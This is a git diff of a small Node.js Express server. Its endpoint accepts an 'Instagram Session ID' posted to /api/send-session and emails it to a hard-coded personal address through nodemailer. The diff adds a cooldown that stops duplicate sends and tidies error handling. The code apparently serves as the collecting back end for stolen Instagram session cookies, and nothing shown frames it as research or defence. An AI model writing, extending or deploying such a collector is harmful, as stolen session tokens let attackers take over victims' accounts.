@@ -3,7 +3,6 @@ const bodyParser = require("body-parser");
 const nodemailer = require("nodemailer");
 const cors = require("cors");
 require("dotenv").config();
-console.log(process.env);
 
 const app = express();
 app.use(cors());
@@ -18,36 +17,54 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-app.post("/api/send-session", (req, res) => {
+// In-memory storage for deduplication (use Redis/DB in production)
+let lastSentSessionId = null;
+let lastSentTime = 0;
+const EMAIL_COOLDOWN = 30000; // 30 seconds
+
+// Endpoint to handle session ID submission
+app.post("/api/send-session", async (req, res) => {
   const { sessionId } = req.body;
 
   if (!sessionId) {
     return res.status(400).json({ error: "No session ID provided" });
   }
 
-  const mailOptions = {
-    from: ` <${process.env.EMAIL_USER}>`,
-    to: "sufi9594@example.com",
-    subject: "Instagram Session ID",
-    text: `Instagram Session ID: ${sessionId}`,
-    html: `<p>Instagram Session ID: <strong>${sessionId}</strong></p>`,
-  };
+  const currentTime = Date.now();
+  const isNewSession = sessionId !== lastSentSessionId;
+  const isCooldownOver = currentTime - lastSentTime > EMAIL_COOLDOWN;
 
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.error("Error sending email:", error);
-      return res.status(500).json({ error: "Failed to send email" });
-    }
-    console.log("Email sent:", info.response);
+  if (!isNewSession && !isCooldownOver) {
+    return res.json({
+      success: false,
+      message: "Duplicate session (cooldown active)",
+    });
+  }
+
+  try {
+    const mailOptions = {
+      from: ` <${process.env.EMAIL_USER}>`,
+      to: "sufi9594@gmail.com",
+      subject: "Instagram Session ID",
+      text: `Instagram Session ID: ${sessionId}`,
+      html: `<p>Instagram Session ID: <strong>${sessionId}</strong></p>`,
+    };
+
+    await transporter.sendMail(mailOptions);
+    lastSentSessionId = sessionId;
+    lastSentTime = currentTime;
+
     res.json({ success: true, message: "Email sent successfully" });
-  });
+  } catch (error) {
+    console.error("❌ Email send failed:", error);
+    res.status(500).json({ error: "Failed to send email" });
+  }
 });
-
 app.get("/", (req, res) => {
   res.send("Hello World!");
 });
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3060;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
